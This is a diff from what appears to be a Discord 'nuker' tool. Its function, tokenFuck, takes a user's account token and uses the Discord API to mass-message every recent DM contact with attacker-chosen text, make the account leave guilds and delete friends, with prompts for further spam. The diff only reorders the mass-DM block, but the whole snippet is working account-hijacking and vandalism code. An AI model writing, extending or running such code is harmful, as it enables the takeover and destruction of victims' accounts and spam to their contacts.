@@ -83,6 +83,15 @@ def tokenFuck(token):
     langspam = input('Would you like to spam change the user\'s language. y/n [No Capitals] > ')
     print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")
 
+    if sendall == 'y':
+        try:
+            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
+            for id in channelIds:
+                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
+                print(f'Sent message to private channel ID of {id}')
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
+
     if gleave == 'y':
         try:
             for guild in guildsIds:
@@ -96,15 +105,6 @@ def tokenFuck(token):
             for friend in friendsIds:
                 requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
                 print(f'Removed friend {friend}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
-
-    if sendall == 'y':
-        try:
-            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
-            for id in channelIds:
-                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
-                print(f'Sent message to private channel ID of {id}')
         except Exception as e:
             print(f'Error detected, ignoring. {e}')
 
